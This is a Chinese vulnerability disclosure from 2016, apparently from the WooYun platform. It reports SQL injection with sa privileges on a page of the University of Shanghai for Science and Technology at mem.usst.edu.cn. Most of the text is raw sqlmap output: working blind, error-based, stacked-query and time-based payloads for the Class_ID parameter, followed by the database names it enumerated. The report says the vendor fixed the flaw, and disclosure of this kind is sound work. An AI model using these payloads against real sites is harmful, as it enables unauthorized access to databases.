wybug_title: 上海理工大学某站SQL注入一枚
wybug_detail:
漏洞详情 披露状态：   									2016-02-09：	细节已通知厂商并且等待厂商处理中									2016-02-10：	厂商已经确认，细节仅向厂商公开									2016-02-20：	细节向核心白帽子及相关领域专家公开									2016-02-25：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： sql注射漏洞 sa权限.... 详细说明：  http://mem.usst.edu.cn/ActivityInformationDetail.aspx?Class_ID=38&InfoId=705 注入[*] starting at 20:16:07[20:16:07] [INFO] resuming back-end DBMS 'microsoft sql server'[20:16:07] [INFO] testing connection to the target URL[20:16:07] [WARNING] reflective value(s) found and filtering outsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: Class_ID (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Class_ID=11 AND 4290=4290    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: Class_ID=11 AND 5621=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (5621=5621) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(112)+CHAR(113)))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Class_ID=11; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Class_ID=11 WAITFOR DELAY '0:0:5'--    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: Class_ID=(SELECT CHAR(113)+CHAR(120)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (9649=9649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(112)+CHAR(113))---[20:16:07] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[20:16:07] [INFO] fetching database names[20:16:07] [INFO] the SQL query used returns 8 entries[20:16:07] [INFO] retrieved: master[20:16:08] [INFO] retrieved: MBA[20:16:08] [INFO] retrieved: MEM[20:16:08] [INFO] retrieved: model[20:16:08] [INFO] retrieved: msdb[20:16:08] [INFO] retrieved: ReportServer[20:16:08] [INFO] retrieved: ReportServerTempDB[20:16:08] [INFO] retrieved: tempdbavailable databases [8]:[*] master[*] MBA[*] MEM[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[20:16:09] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 9 times[20:16:09] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\mem.usst.edu.cn'[*] shutting down at 20:16:09
